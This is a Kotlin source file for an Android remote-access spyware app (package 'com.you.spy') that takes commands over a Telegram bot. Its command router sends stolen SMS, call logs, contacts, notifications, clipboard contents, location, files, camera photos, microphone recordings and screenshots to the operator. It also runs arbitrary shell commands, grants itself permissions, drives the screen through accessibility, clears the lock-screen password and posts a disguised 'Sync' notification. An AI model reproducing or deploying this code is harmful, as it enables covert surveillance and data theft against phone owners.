package com.you.spy.service

import android.app.admin.DevicePolicyManager
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import com.you.spy.collect.Capture
import com.you.spy.collect.Collectors
import com.you.spy.collect.FileOps
import com.you.spy.collect.Location
import com.you.spy.net.TgApi
import com.you.spy.receiver.AdminReceiver
import com.you.spy.shell.Shell
import com.you.spy.util.Config
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File

object CommandRouter {

    const val HELP = """
<b>Commands</b>
<pre>
/status  /battery  /wifi  /net  /loc  /find
/sms n  /calls n  /contacts  /apps  /notif n
/photo f|b  /mic sec  /screen  /dump
/ls path  /get path  /rm path  /put (reply)
/tap x y  /swipe x1 y1 x2 y2  /type txt  /click txt
/clip  /toast t  /open pkg  /url u  /vol 0-15  /bright 0-255
/ring  /vibrate  /lock  /unlock  /flash on|off
/sh cmd  /shell root|shizuku|auto  /grant perm
/reboot  /gps  /data on|off  /airplane
</pre>
"""

    suspend fun handle(ctx: Context, update: JSONObject): Unit = withContext(Dispatchers.IO) {
        val msg = update.optJSONObject("message") ?: return@withContext
        val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@withContext

        val raw = msg.optString("text").ifEmpty {
            if (msg.has("document")) "/put" else return@withContext
        }

        // ---- auth ----
        if (Config.chat.isEmpty()) {
            val code = Config.code
            if (code.isNotEmpty() && raw.contains(code)) {
                Config.chat = chatId
                TgApi.send("✅ Connected to <code>$chatId</code>\n/help")
            } else {
                TgApi.send("Send <code>/start $code</code> to pair")
            }
            return@withContext
        }
        if (chatId != Config.chat) return@withContext

        val parts = raw.trim().split(Regex("\\s+"), limit = 2)
        val cmd = parts[0].lowercase().removePrefix("/").substringBefore("@")
        val arg = parts.getOrNull(1)?.trim().orEmpty()

        runCatching { route(ctx, cmd, arg, msg) }
            .onFailure { TgApi.send("<b>error</b>: ${it.message?.take(300)}") }
    }

    private suspend fun route(ctx: Context, cmd: String, arg: String, msg: JSONObject) {
        when (cmd) {

            "start", "help" -> TgApi.send(HELP)

            "ping" -> TgApi.send("pong ${System.currentTimeMillis()}")

            "status" -> {
                val pm = PowerManager::class.java.let { ctx.getSystemService(it) }
                TgApi.send(buildString {
                    appendLine("<b>${Build.MANUFACTURER} ${Build.MODEL}</b>")
                    appendLine("android ${Build.VERSION.RELEASE} (sdk ${Build.VERSION.SDK_INT})")
                    appendLine("battery ${pct(ctx)}%  charging=${isCharging(ctx)}")
                    appendLine("shell: ${Shell.mode()}")
                    appendLine("accessibility: ${SpyAccessibilityService.instance != null}")
                    appendLine("notif: ${SpyNotificationListener.instance != null}")
                    appendLine("screen: ${Capture.let { "" }}${if (pm.isInteractive) "on" else "off"}")
                })
            }

            "battery" -> TgApi.send("${pct(ctx)}%  charging=${isCharging(ctx)}")

            "wifi" -> TgApi.send(
                Shell.exec("dumpsys wifi | grep -E 'SSID|mWifiInfo' | head -5")
            )

            "net" -> TgApi.send(Shell.exec("ip -o addr show | head -20"))

            "loc" -> {
                val s = Location.best(ctx)
                TgApi.send("<pre>${esc(s)}</pre>")
            }

            "find" -> {
                val s = Location.best(ctx)
                val m = Regex("(-?\\d+\\.\\d+), (-?\\d+\\.\\d+)").find(s)
                if (m != null) {
                    TgApi.send("<a href=\"${Location.mapLink(m.groupValues[1].toDouble(), m.groupValues[2].toDouble())}\">map</a>\n<pre>${esc(s)}</pre>")
                } else TgApi.send("<pre>${esc(s)}</pre>")
            }

            "sms" -> chunk(Collectors.sms(ctx, arg.toIntOrNull() ?: 30))

            "calls" -> chunk(Collectors.calls(ctx, arg.toIntOrNull() ?: 30))

            "contacts" -> chunk(Collectors.contacts(ctx))

            "apps" -> chunk(Collectors.apps(ctx, arg == "all"))

            "notif" -> chunk(SpyNotificationListener.recent(arg.toIntOrNull() ?: 20))

            "dump" -> chunk(SpyAccessibilityService.instance?.dumpScreen() ?: "accessibility off")

            "photo" -> {
                TgApi.typing("upload_photo")
                val b = Capture.photo(ctx, arg.equals("f", true))
                if (b == null) TgApi.send("camera failed")
                else TgApi.sendBytes(b, "photo.jpg", true)
            }

            "mic" -> {
                TgApi.send("recording ${arg.ifEmpty { "10" }}s")
                val f = Capture.record(ctx, arg.toIntOrNull() ?: 10)
                if (f == null) TgApi.send("mic failed")
                else {
                    TgApi.sendFile(f, false)
                    f.delete()
                }
            }

            "screen" -> {
                TgApi.typing("upload_photo")
                val b = Capture.screen(ctx)
                if (b == null) TgApi.send("start ScreenCaptureActivity first")
                else TgApi.sendBytes(b, "screen.jpg", true)
            }

            "ls" -> chunk(FileOps.ls(arg))

            "get" -> {
                val f = FileOps.file(arg)
                if (f == null) TgApi.send("not a file: $arg")
                else if (f.length() > 49_000_000L) TgApi.send("too big (${f.length()} bytes, limit 50MB)")
                else {
                    TgApi.typing("upload_document")
                    TgApi.sendFile(f, f.name.endsWith(".jpg") || f.name.endsWith(".png"), f.name)
                }
            }

            "put" -> {
                val doc = msg.optJSONObject("document")
                if (doc == null) { TgApi.send("reply to a file with /put"); return }
                val name = doc.optString("file_name", "in_${System.currentTimeMillis()}")
                val dest = File(ctx.filesDir, name)
                val ok = TgApi.download(doc.optString("file_id"), dest) != null
                TgApi.send(if (ok) "saved ${dest.absolutePath} (${dest.length()} bytes)" else "download failed")
            }

            "rm" -> TgApi.send(FileOps.rm(arg))

            "tap" -> {
                val c = arg.split(" ").mapNotNull { it.toFloatOrNull() }
                if (c.size < 2) { TgApi.send("usage: /tap x y"); return }
                SpyAccessibilityService.instance?.tap(c[0], c[1])
                TgApi.send("tapped")
            }

            "swipe" -> {
                val c = arg.split(" ").mapNotNull { it.toFloatOrNull() }
                if (c.size < 4) { TgApi.send("usage: /swipe x1 y1 x2 y2"); return }
                SpyAccessibilityService.instance?.swipe(c[0], c[1], c[2], c[3])
                TgApi.send("swiped")
            }

            "type" -> TgApi.send(
                if (SpyAccessibilityService.instance?.type(arg) == true) "typed" else "no field focused"
            )

            "click" -> TgApi.send(
                if (SpyAccessibilityService.instance?.clickByText(arg) == true) "clicked" else "not found"
            )

            "clip" -> {
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val text = cm.primaryClip?.getItemAt(0)?.coerceToText(ctx)?.toString()
                TgApi.send("<pre>${esc(text ?: "empty")}</pre>")
            }

            "toast" -> {
                Shell.exec("cmd notification post -S bigtext -t Sync t '$arg'")
                TgApi.send("toast sent")
            }

            "open" -> {
                val i = ctx.packageManager.getLaunchIntentForPackage(arg)
                if (i == null) TgApi.send("not installed: $arg")
                else {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                    TgApi.send("launched")
                }
            }

            "url" -> {
                ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(arg))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                TgApi.send("opened")
            }

            "vol" -> {
                val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                val v = (arg.toIntOrNull() ?: (max / 2)).coerceIn(0, max)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, v, 0)
                TgApi.send("volume $v/$max")
            }

            "bright" -> {
                val v = (arg.toIntOrNull() ?: 128).coerceIn(1, 255)
                Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS, v)
                TgApi.send("brightness $v")
            }

            "ring" -> {
                val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.setRingerMode(AudioManager.RINGER_MODE_NORMAL)
                am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
                TgApi.send("ringing")
            }

            "vibrate" -> {
                val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                val ms = arg.toLongOrNull() ?: 800
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                TgApi.send("vibrated")
            }

            "lock" -> {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = android.content.ComponentName(ctx, AdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) { dpm.lockNow(); TgApi.send("locked") }
                else TgApi.send("admin not active")
            }

            "unlock" -> {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = android.content.ComponentName(ctx, AdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    dpm.resetPassword("", 0)
                    TgApi.send("password cleared")
                } else TgApi.send("admin not active")
            }

            "flash" -> {
                val cm = ctx.getSystemService(CameraManager::class.java)
                val id = cm.cameraIdList.firstOrNull()
                if (id == null) { TgApi.send("no flash"); return }
                cm.setTorchMode(id, arg.equals("on", true))
                TgApi.send("flash ${if (arg.equals("on", true)) "on" else "off"}")
            }

            "shell" -> {
                Config.shellMode = arg.ifEmpty { "auto" }
                TgApi.send("shell mode: ${Shell.mode()}")
            }

            "sh" -> {
                if (arg.isBlank()) { TgApi.send("usage: /sh cmd"); return }
                TgApi.send("<pre>${esc(Shell.exec(arg))}</pre>")
            }

            "grant" -> TgApi.send("<pre>${esc(Shell.exec("pm grant com.you.spy $arg"))}</pre>")

            "revoke" -> TgApi.send("<pre>${esc(Shell.exec("pm revoke com.you.spy $arg"))}</pre>")

            "gps" -> {
                val v = if (arg.equals("on", true)) "1" else "0"
                val r = Shell.exec("settings put secure location_mode ${if (v == "1") 3 else 0}")
                TgApi.send("gps -> $v\n$r")
            }

            "data" -> {
                val on = arg.equals("on", true)
                val r = Shell.exec(if (on) "svc data enable" else "svc data disable")
                TgApi.send("data $arg\n$r")
            }

            "airplane" -> {
                val r = Shell.exec(
                    "cmd connectivity airplane-mode ${if (arg.equals("on", true)) "enable" else "disable"}"
                )
                TgApi.send(r)
            }

            "reboot" -> {
                TgApi.send("rebooting")
                Shell.exec(if (arg == "recovery") "reboot recovery" else "reboot")
            }

            else -> TgApi.send("unknown: /$cmd — /help")
        }
    }

    private suspend fun chunk(text: String) {
        val clean = text.ifBlank { "(empty)" }
        clean.chunked(3800).forEach { TgApi.send("<pre>${esc(it)}</pre>") }
    }

    private fun esc(s: String) = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    private fun pct(ctx: Context): Int {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isCharging(ctx: Context): Boolean {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.isCharging
    }
}
